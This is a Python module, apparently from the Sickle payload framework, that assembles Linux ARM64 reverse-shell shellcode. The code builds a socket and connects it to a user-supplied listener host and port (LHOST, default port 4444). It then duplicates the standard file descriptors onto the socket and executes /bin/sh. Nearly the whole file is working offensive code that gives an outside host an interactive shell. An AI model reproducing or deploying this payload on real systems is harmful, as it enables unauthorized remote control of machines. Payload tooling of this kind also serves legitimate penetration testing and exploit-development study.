from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import port_str_to_htons

import sys
import struct
import binascii

class Shellcode():

    author      = "wetw0rk"
    description = "Linux (AARCH64 or ARM64) SH Reverse Shell"
    example_run = f"{sys.argv[0]} -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c"

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

    def get_shellcode(self):
        """TODO
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = argv_dict["LPORT"]

        sc_builder = Assembler('arm64')

        source_code = "_start:\n"
        source_code += "\n"
        source_code += "create_sockfd:\n"
        source_code += "        // int socket(int domain,   // x0 => AF_INET\n"
        source_code += "        //            int type,     // x1 => SOCK_STREAM\n"
        source_code += "        //            int protocol) // x2 => IPPROTO_IP\n"
        source_code += "        mov x0, #2\n"
        source_code += "        mov x1, #1\n"
        source_code += "        mov x2, #0\n"
        source_code += "        mov x8, #198 // socket syscall\n"
        source_code += "        svc #1337    // call the supervisor xD and let the kernel know we're l33t\n"
        source_code += "        mov x19, x0  // save the returned sockfd into x19\n"
        source_code += "\n"
        source_code += "connect:\n"
        source_code += "        // int connect(int sockfd,                  // x0 => sockfd obtained from socket() call\n"
        source_code += "        //             const struct sockaddr *addr, // x1 => pointer to the stack containing formatted structure\n"
        source_code += "        //             socklen_t addrlen);          // x2 => size of the structure itself\n"
        source_code += "\n"
        source_code += "        sub sp, sp, #16\n"
        source_code += "        mov w0, #2\n"
        source_code += "        str w0, [sp]\n"
        source_code += "        mov w0, #{}\n".format(hex(port_str_to_htons(lport)))
        source_code += "        strh w0, [sp, #2]\n"
        source_code += "        ldr w0, ={}\n".format(hex(ip_str_to_inet_addr(argv_dict["LHOST"])))
        source_code += "        str w0, [sp, #4]\n"
        source_code += "        mov x0, x19\n"
        source_code += "        mov x1, sp\n"
        source_code += "        mov x2, #16\n"
        source_code += "        mov x8, #203 // connect syscall\n"
        source_code += "        svc #1337\n"
        source_code += "\n"
        source_code += "start_loop:\n"
        source_code += "        // while (i != 0) {\n"
        source_code += "        //     i--;\n"
        source_code += "        //     dup3(int oldfd,  // x0 => sockfd\n"
        source_code += "        //          int newfd,  // x1 => (STDIN | STDOUT | STDERR)\n"
        source_code += "        //          int flags); // x2 => 0x00\n"
        source_code += "        // }\n"
        source_code += "        mov x21, #0\n"
        source_code += "        mov x21, #3\n"
        source_code += "\n"
        source_code += "change_fd:\n"
        source_code += "        sub x21, x21, #1\n"
        source_code += "dup2:\n"
        source_code += "        mov x0, x19\n"
        source_code += "        mov x1, x21\n"
        source_code += "        mov x2, #0\n"
        source_code += "        mov x8, #24 // dup3 syscall\n"
        source_code += "        svc #1337\n"
        source_code += "        cmp x21, 0\n"
        source_code += "        bne change_fd\n"
        source_code += "\n"
        source_code += "execve:\n"
        source_code += "        // int execve(const char *pathname,          // x0 => pointer to the stack containing '/bin/sh'\n"
        source_code += "        //            char *const _Nullable argv[],  // x1 => NULL\n"
        source_code += "        //            char *const _Nullable envp[]); // x2 => NULL\n"
        source_code += "        ldr x3, =0x68732f6e69622f\n"
        source_code += "        str x3, [sp, #-8]!\n"
        source_code += "        mov x0, sp\n"
        source_code += "        mov x1, #0\n"
        source_code += "        mov x2, #0\n"
        source_code += "        mov x8, #221 // execve syscall\n"
        source_code += "        svc #1337\n"

        return sc_builder.get_bytes_from_asm(source_code)
